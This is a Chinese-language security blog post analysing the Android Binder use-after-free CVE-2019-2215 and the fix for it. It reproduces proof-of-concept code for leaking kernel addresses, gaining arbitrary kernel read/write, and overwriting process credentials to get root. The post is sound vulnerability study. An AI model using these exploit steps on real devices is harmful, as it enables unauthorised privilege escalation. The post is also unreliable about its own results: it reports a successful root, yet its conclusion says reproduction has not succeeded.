---
title: "CVE-2019-2215 Bad Binder"
date: 2020-11-06T15:59:07+08:00
lastmod: 2020-11-19T22:05:00+00:00
tags: ["Pwn","Android","Kernel"]
draft: false
---

## 概述

CVE-2019-2215是一个Use After Free类型的安卓内核漏洞，攻击者可以使用这个漏洞达到本地提权的效果。该漏洞可能存在于Pixel 1和2等设备上，并且在Linux内核版本>4.14的版本中不存在。关于更多漏洞的详情可以参考[CVE官网](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2215)和Google Project Zero的[博客](https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html)。

-----

## 漏洞复现过程

网上已经有很多该漏洞的POC可供研究，这里就直接使用[timwr/CVE-2019-2215](https://github.com/timwr/CVE-2019-2215.git)这个仓库的poc进行复现。复现使用的设备是Pixel 2XL，在复现过程中实际上碰到了很多问题，其中很大一部分是在寻找kernel image和配置环境上。感谢LKK，HR和DRQ在此过程中的帮助。

首先借了一台Pixel 2XL的手机，在上面刷入了[8.1.0 (OPM2.171026.006.H1, Jul 2018)](https://flash.android.com/build/4833802?target=taimen-user&signed)镜像。之后使用TWRP和Magisk进行Root。然后获取内核符号表，算好poc中涉及的几个符号偏移并填入。最后编译运行poc.c得到root权限。
```bash
echo 1 > /proc/sys/kernel/kptr_restrict
cat /proc/kallsyms
```

下面是root过程的演示:
[![asciicast](https://asciinema.org/a/eZdnD8HfZvKYEUkeYtmHCsWOW.svg)](https://asciinema.org/a/eZdnD8HfZvKYEUkeYtmHCsWOW)

> 简单记录一下我的复现失败历史。一开始以为google官方放出的镜像都是patch后的，但实际上并不是。基于这个假设做了很多麻烦的事情，首先是尝试自己编译安卓内核，在这方面耗费了大量时间进行环境配置和搜索；之后又尝试在qemu中去使用Linux Kernel复现，但是不知道为什么无论选择什么Linux版本编译出来的kernel image都无法触发UAF的漏洞；最后还是在官网上找了一个和poc环境相近的安卓image，借了一台Pixel 2XL才成功完成。

## 漏洞利用原理

这个漏洞的产生原因是安卓内核中`binder_thread`这个结构体被释放后，其中的wait字段仍然能够被epoll使用，从而可以导致Use-After-Free(UAF)。

```C
// drivers/android/binder.c
struct binder_thread {
	struct binder_proc *proc;
	struct rb_node rb_node;
	struct list_head waiting_thread_node;
	int pid;
	int looper;              /* only modified by this thread */
	bool looper_need_return; /* can be written by other thread */
	struct binder_transaction *transaction_stack;
	struct list_head todo;
	bool process_todo;
	struct binder_error return_error;
	struct binder_error reply_error;
	wait_queue_head_t wait;
	struct binder_stats stats;
	atomic_t tmp_ref;
	bool is_dead;
	struct task_struct *task;
};
```

```C
// include/linux/wait.h
struct __wait_queue_head {
	spinlock_t		lock;
	struct list_head	task_list;
};
typedef struct __wait_queue_head wait_queue_head_t;
```

```C
// include/linux/types.h
struct list_head {
	struct list_head *next, *prev;
};
```

在用`BINDER_THREAD_EXIT`调用`binder_ioctl`时,`binder_ioctl`会调用`binder_thread_release`这个函数来释放`binder_thread`使用的内存。虽然`binder_thread_release`调用释放了`binder_thread`的内存空间，但若线程中调用了`epoll`，则`binder_poll`仍然会使用`binder_thread`结构体中的`wait`结构体，从而可以进行UAF攻击。

```C
static long binder_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    // ...
    switch (cmd) {
    // ...
	case BINDER_THREAD_EXIT:
		binder_debug(BINDER_DEBUG_THREADS, "%d:%d exit\n",
			     proc->pid, thread->pid);
		binder_thread_release(proc, thread);
		thread = NULL;
		break;
    // ...
    }
    // ...
}
```

```C
static unsigned int binder_poll(struct file *filp,
				struct poll_table_struct *wait)
{
	struct binder_proc *proc = filp->private_data;
	struct binder_thread *thread = NULL;
	bool wait_for_proc_work;

	thread = binder_get_thread(proc);
    // ...
	poll_wait(filp, &thread->wait, wait); // wait is used
    // ...
}
```

在攻击过程中可以使用[Vectored IO](https://en.wikipedia.org/wiki/Vectored_I/O)操作构造内核空间中的任意地址读写。Vectored IO也被称为scatter/gather IO，这是因为其读操作(`readv`)将一个buffer中的内容分开拷贝到了多个buffer中，而其写操作(`writev`)将多个buffer中的内容合并到了一个buffer中。攻击过程中主要使用`writev`和`recvmsg`这两个函数分别从vectored IO中读取数据，和向其中写入数据。

![](https://xylearn-cloud-img.oss-cn-shanghai.aliyuncs.com/img/20191125143428-a164e062-0f4d-1-2020-11.png)

```C
// fs/read_write.c
SYSCALL_DEFINE3(readv, unsigned long, fd, const struct iovec __user *, vec,
                unsigned long, vlen)

SYSCALL_DEFINE3(writev, unsigned long, fd, const struct iovec __user *, vec,
                unsigned long, vlen)
```

下面是`iovec`的结构体，`iov_base`字段是一个指向用户空间的指针，`iov_len`表示这个区域需要读写的大小。
```C
// fs/read_write.c
struct iovec
{
        void __user *iov_base; 
        __kernel_size_t iov_len; 
};
```

通常Vectored IO操作都会涉及多个`iovec`，内核除了要管理多个`iovec`数组外，还要记录和iovec迭代相关的信息，用`iov_iter`来表示。其中的`iov_offset`就表示了读写操作进行到了第几个`iovec`。
```C
// include/linux/uio.h
struct iov_iter {
	int type;
	size_t iov_offset;
	size_t count;
	union {
		const struct iovec *iov;
		const struct kvec *kvec;
		const struct bio_vec *bvec;
		struct pipe_inode_info *pipe;
	};
	union {
		unsigned long nr_segs;
		struct {
			int idx;
			int start_idx;
		};
	};
};
```

Linux Vectored IO的读写函数都会调用`do_readv_writev`这个函数，这个函数调用了`import_iovec`函数，`import_iovec`函数又会调用`rw_copy_check_uvector`来。在`rw_copy_check_uvector`函数中，内核会将用户指定的iovec数组拷贝到内核空间，并检查用户是否有权访问iovec数组中`iov_base`指向的内存空间。在调用`import_iovec`函数之后，内核才会开始对iovec的后续读写操作。Vectored IO的这些性质决定了它是一个用来实现攻击的绝佳工具，首先一个用户可以利用Vectored IO的读写操作在内核空间中分配任意大小0x10字节对其的堆块，并且对堆块进行受限的写操作——`iov_base`必须合法，或者`iov_len`为0；其次，内核不会检查读写过程中对内核空间iovec数组是否被修改，这为我们后续的攻击提供了便利。

## 漏洞利用过程

### 初始化

在这一部分先简单介绍一下之后会使用到的一些东西的初始化过程。
Init1中创建了一个`binder`并且使用`epoll_create`来创建一个队列供`binder_thread`使用。这样在之后的epoll操作中就可以引用`binder_thread`中的`wait`字段。
Init2中向epoll队列中添加了一个元素，这是为之后队列上的的unlink作准备。
Init3中申请了一个基地址为4g的内存区域，这是为了生成一个地址低4字节为`0`的合法地址。
Init4中创建了一个管道方便之后父子进程的IO通信。
Init5中构造了一个iovec数组。
```C
  // #Init1
  binder_fd = open("/dev/binder", O_RDONLY);
  epfd = epoll_create(1000);
  // #Init2
  struct epoll_event event = {.events = EPOLLIN};
  epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &event);
  // #Init3
  dummy_page = mmap((void *)0x100000000ul, 2 * PAGE_SIZE,
                      PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  // #Init4
  int pipe_fd[2];
  pipe(pipe_fd);
  // #Init5
  iovec iovs[25];
  memset(&iovs, 0, sizeof(iovs));
  iov_idx = 10;
  iovs[iov_idx].iov_base = dummy_page; /* spinlock in the low address half mustbe zero */
  iovs[iov_idx].iov_len = PAGE_SIZE; /* wq->task_list->next */
  iovs[iov_idx + 1].iov_base = (void *)0xdeadbeef; /* wq->task_list->prev */
  iovs[iov_idx + 1].iov_len = PAGE_SIZE;
```

### 泄露task_struct地址

下图是使用UAF泄露task_struct地址的主要流程。
![UAF-Flow-Graph](https://xylearn-cloud-img.oss-cn-shanghai.aliyuncs.com/img/CVE-2019-2215%20UAF-Flow%20graph%20for%20blog-2-2020-11.png)

在这个流程中使用到了两个进程，使用pipe通信以方便进行IO读写和在必要时阻塞IO。主进程负责释放`binder_thread`结构体，调用`writev`获取和修改chunk，进一步泄露地址；而子进程负责触发wait_queue的unlink，读取dummy page。

我们先使用`writev`来实现对`binder_thread`结构体的写和读。首先需要在内核中分配一个可以被我们控制的chunk来获取释放的`binder_thread`的chunk。`Vectored IO`的读写操作会调用`rw_copy_check_uvectior`在内核空间分配一块内存，并将用户传递的iovec结构体数组拷贝到内核空间中。由于`binder_thread`结构体大小为408 bytes，我们需要在内核中分配一块400 bytes到416 bytes大小的堆块来得到freed chunk。iovec结构体大小为16 bytes，所以我们可以构造一个长度为25的iovec数组来在内核中申请400 bytes的空间，从而获取到`binder_thread`的堆块，同时又不覆盖到`binder_thread`中的`task`字段，我们之后要用它来泄露地址。
```C
// fs/read_write.c
ssize_t rw_copy_check_uvector(int type, const struct iovec __user * uvector,
			      unsigned long nr_segs, unsigned long fast_segs,
			      struct iovec *fast_pointer,
			      struct iovec **ret_pointer)
{
    // ...

	/*
	 * First get the "struct iovec" from user memory and
	 * verify all the pointers
	 */
	if (nr_segs > UIO_MAXIOV) {
		ret = -EINVAL;
		goto out;
	}
	if (nr_segs > fast_segs) {
		iov = kmalloc(nr_segs*sizeof(struct iovec), GFP_KERNEL);
		if (iov == NULL) {
			ret = -ENOMEM;
			goto out;
		}
	}
	if (copy_from_user(iov, uvector, nr_segs*sizeof(*uvector))) {
		ret = -EFAULT;
		goto out;
	}
    // ...
}
```

在构造iovec数组时，由于需要覆盖的`wait`字段在`binder_thread`中的偏移是160，因此iovec数组的第10个元素(从0开始，160/16)是`wait`的首地址，这个地址处是一个spinlock，为了后续能够成功调用`__remove_wait_queue`我们需要让其值为0。所以iovec数组第10个元素的`iov_base`的低4字节需要为0，即`iov_base`需要对其4G(0x100000000)的地址。在调用`writev``将iovec`数组被分配到原来`binder_thread`的堆块后，其内存的布局如下
![](https://xylearn-cloud-img.oss-cn-shanghai.aliyuncs.com/img/vavCg5-2020-11.png)

之后我们使用一个unlink来使`wait.task_list.next`和`wait.task_list.prev`都指向自身。为达成这一点，我们先让主进程阻塞，让子线程调用使用`EPOLL_CTL_DEL`调用`epoll_ctl`。在`EPOLL_CTL_DEL`的处理逻辑中会调用`remove_wait_queue`从队列中删除一个list entry。由于我们一开始在队列中已经添加了一个元素`entry`，所以在调用`remove_wait_queue`前wait_queue的布局如下

![WQ layout Before](https://xylearn-cloud-img.oss-cn-shanghai.aliyuncs.com/img/CVE-2019-2215-wq-layout-before-remove-2020-11.png)

当调用了`remove_wait_queue`之后，由于触发了unlink操作，`wait.task_list->prev`被赋值为`entry->prev`，`wait.task_list->next`被赋值为`entry->next`，这两个值均为`wait.task_list`的地址。如下所示。但是要注意如果`CONFIG_DEBUG_LIST`这个内核选项被打开了，那么这一步会失败，因为进行了额外的unlink检查

![WQ layout After](https://xylearn-cloud-img.oss-cn-shanghai.aliyuncs.com/img/CVE-2019-2215-wq-layout-after-remove-2020-11.png)

```C
static inline void __list_del(struct list_head * prev, struct list_head * next)
{
        next->prev = prev;
        WRITE_ONCE(prev->next, next);
}

#ifndef CONFIG_DEBUG_LIST
...
static inline void list_del(struct list_head *entry)
{
        __list_del(entry->prev, entry->next);
        entry->next = LIST_POISON1;
        entry->prev = LIST_POISON2;
}
```

经过这些步骤我们成功将iovec数组中的`iovec[10].iov_len`和`iovec[11].iov_base`的地址修改为了`binder_thread+0xA8`的地址，这样之后我们从`writev`写入的缓冲区中（在POC中为pipe管道）就可以读出`binder_thread+0xA8`之后的内容了，而其中位于`binder_thread+0x190`的`task_struct`指针地址就可以成功被我们读到。在此之前我们需要从pipe中读取原来`iovec[10].iov_base`中长度为`0x1000`的内容。

这里可能容易不清楚的地方是`iovec[10].iov_len`的值不是已经被修改为地址了吗，为什么还是只需要读1个page。其实在调用writev的时候，已经将`iovec[10].iov_base`中的内容写进了pipe，所以此时在vectored IO已经将`iovec[10]`中的内容写完了，切换到`iovec[11]`。同时由于一开始将pipe的大小设置为0x1000，所以`writev`向pipe中写入`iovec[10]`的内容后管道会被阻塞，当子线程从管道中读取数据后writev才会继续向管道内写入`iovec[11]`的数据。

### 实现任意地址读写

`task_struct`是一个进程控制块(PCB)结构体，其中存储了很多进程线程的信息，操作系统通过管理这些信息来实现对进程线程的操作。在泄露`binder_thead.task`的地址后我们可以通过覆盖`task.thread_info.addr_limit`字段来实现对整个内存空间（用户空间和内核空间）的读写。

使用上一节的方法，我们可以去控制`binder_thread+0xA8`之后除了`task`的内容，和如何使用unlink将`binder_thread+0xA8`的地址写到`binder_thread+0xA8`和`binder_thread+0xB0`上。接下来我们要做的就是在此基础上去实现对目标地址(`task.thread_info.addr_limit`)的写操作。其思路就是：
1. 故技重施，将iovec数组的内容拷贝到chunk中；
2. 使用unlink将`iovec[11].iov_base`修改为`binder_thread+0xA8`；
3. 通过对iovec的写操作(使用`recvmsg`)，向`iovec[11]`写入构造好的新的iovec内容，使得`iovec[12].iov_base`指向目标地址；
4. 继续向iovec中写入想要修改的值，达到修改目标地址内容的目的。

我们使用`recvmsg`来完成以上的目标，这里不使用`readv`的一个主要原因可能是`readv`可能并不会等待所有数据读取完成，而直接返回，这会造成没有成功覆盖`addr_limit`；而使用`MSG_WAITALL`的`recvmsg`会等待将所有输入读取完成后才返回。

在上述的第一步中，我们构造如下一个iovec数组，来reallocate和覆盖内核中的`binder_thread`结构体（省略号表示的其他iovec字段均为0）：
![](https://xylearn-cloud-img.oss-accelerate.aliyuncs.com/img/cve-201902215-write-write1-2020-11-19-22.png)

在第二步之前先向socket写入一个字节数据来跳过`iovec[10]`，使得`iov_iter`中的`iov_offset`指向`iovec[11]`。之后我们故技重施从队列中删除一个list entry来触发unlink，触发unlink后的iovec数组布局如下：
![](https://xylearn-cloud-img.oss-accelerate.aliyuncs.com/img/cve-201902215-write-unlink-2020-11-19-22.png)

接着在第三步中我们构造一个新的iovec数组，这个数组会被写入`binder_thread+0xA8`，因为`iovec[11].iov_base`已经通过unlink被修改为了`binder_thread+0xA8`，在构造的payload中，我们将`iovec[12].iov_base`修改为我们要写的目标地址，即addr_limit的地址，这个地址可以通过`task_struct`的地址算出。在第三步后的iovec数组布局如下：
![](https://xylearn-cloud-img.oss-accelerate.aliyuncs.com/img/cve-201902215-write-write2-2020-11.png)

在第四步中，我们向目标地址写入我们想写的内容。对于addr_limit，我们将它修改为`0xFFFFFFFFFFFFFFFE`就可以达到任意地址读写的目的，修改完成后内存的布局如下：。

![](https://xylearn-cloud-img.oss-cn-shanghai.aliyuncs.com/img/mUVrk5-2020-11.png)

此时我们已经可以读写内核中的任意地址了。

### 提权

有了内核的任意地址读写能力，那么实现提权就手到擒来了。
可以通过修改`task_struct`中的`cred`字段来实现进程权限提升
```C
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key __rcu *session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	struct rcu_head	rcu;		/* RCU deletion hook */
};
```

首先获取`task`中`cred`和`security`的地址
```C
  unsigned long my_cred = kernel_read_ulong(current_ptr + OFFSET__task_struct__cred);
  // offset 0x78 is pointer to void * security
  unsigned long current_cred_security = kernel_read_ulong(my_cred+0x78);
```
然后将`cred`中的各种ID改成root ID(0)，重置`cred.securebits`，并且将各种capability打开，此时已经可以用root权限执行任意代码了。
```C
  // change IDs to root (there are eight)
  for (int i = 0; i < 8; i++)
    kernel_write_uint(my_cred+4 + i*4, 0);
  // reset securebits
  kernel_write_uint(my_cred+0x24, 0);
  // change capabilities to everything (perm, effective, bounding)
  for (int i = 0; i < 3; i++)
    kernel_write_ulong(my_cred+0x30 + i*8, 0x3fffffffffUL);
```
当然我们可以进一步取消SELINUX限制，获取init权限，关闭SECCOMP等。

## 漏洞修复
在Google发布的[补丁](https://android.googlesource.com/kernel/msm/+/550c01d0e051461437d6e9d72f573759e7bc5047%5E%21/#F0)中修复了CVE-2019-2215漏洞。其patch如下
```C
diff --git a/drivers/android/binder.c b/drivers/android/binder.c
index 6b4a991..bb48a7b 100644
--- a/drivers/android/binder.c
+++ b/drivers/android/binder.c
@@ -4535,6 +4535,18 @@
 		if (t)
 			spin_lock(&t->lock);
 	}
+
+	/*
+	 * If this thread used poll, make sure we remove the waitqueue
+	 * from any epoll data structures holding it with POLLFREE.
+	 * waitqueue_active() is safe to use here because we're holding
+	 * the inner lock.
+	 */
+	if ((thread->looper & BINDER_LOOPER_STATE_POLL) &&
+	    waitqueue_active(&thread->wait)) {
+		wake_up_poll(&thread->wait, POLLHUP | POLLFREE);
+	}
+
 	binder_inner_proc_unlock(thread->proc);
 
 	if (send_reply)
```
这个patch位于`binder_thread_release`接近函数末尾的位置。Patch主要增加了一个if条件检查，判断的第一部分`thread->looper & BINDER_LOOPER_STATE_POLL`检查`binder_thread`是否调用了`binder_poll`，第二部分`waitqueue_active(&thread->wait)`实际上检查了`wait`是否是一个空队列。如果`binder_thread`调用了`binder_poll`并且`wait`是一个空队列，那么将调用`wake_up_poll`来释放`wait`队列从而避免UAF。Patch中的注视说明了由于此处线程拥有对`wait`的锁，所以调用`waitqueue_active`判断队列是否为空是安全的（不存在脏读）。

## 总结

CVE-2019-2215是一个典型的kernel memory corruption漏洞，其原因是有效指针指向了内核中无效的堆内存区域。这个漏洞能造成严重的攻击后果，可以造成本地提权和内核的任意地址读写，并且这个漏洞利用简单，不需要依赖于用户操作或是更多的环境配置。这个漏洞于2017年被发现，在2018年2月被Google修复，但是这个漏洞没有被包含在Android的每月安全更新包中，所以在当时很多已发布的Pixel 1和2设备仍然会受到这个漏洞影响。这也从一个角度揭示了开源软件中多分支给安全Patch带来了比较大的麻烦。

从这个漏洞的利用过程中我们可以学习到Linux Kernel Pwn的常用思路。但是Android Kernel调试环境的配置和搭建要难于普通内核的调试环境搭建，这给复现和学习带来了一定的困难。目前还没有成功在模拟器或是真机上成功复现这一漏洞，因为一方面很难找到一个有漏洞版本的安卓Image，另一方面尚未成功针对目标设备或模拟器虚拟设备编译出一个能够正常运行的有漏洞版本的kernel image。

## 参考链接

- [Bad Binder: Android In-The-Wild Exploit](https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html)
- [Android Binder Driver UAF 漏洞实现 Root 提权分析（CVE-2019-2215）](https://www.4hou.com/posts/B1VJ)
- [Issue 1942: Android: Use-After-Free in Binder driver](https://bugs.chromium.org/p/project-zero/issues/detail?id=1942)
- [KASAN: use-after-free Read in __lock_acquire (2)](https://groups.google.com/g/syzkaller-bugs/c/QyXdgUhAF50/m/g-FXVo1OAwAJ)
- [CVE-2019-2215—android内核binder漏洞分析(2)](https://xz.aliyun.com/t/6853)
- [使用 KASAN+KCOV 编译 Pixel 内核](https://source.android.com/devices/tech/debug/kasan-kcov?hl=zh-cn)
- [使用Android模拟器调试linux内核](https://blog.csdn.net/zhangjg_blog/article/details/84291663)
- [Github grant-h/qu1ckr00t](https://github.com/grant-h/qu1ckr00t)
- [Github kangtastic/cve-2019-2215](https://github.com/kangtastic/cve-2019-2215)
- [Github timwr/CVE-2019-2215](https://github.com/timwr/CVE-2019-2215)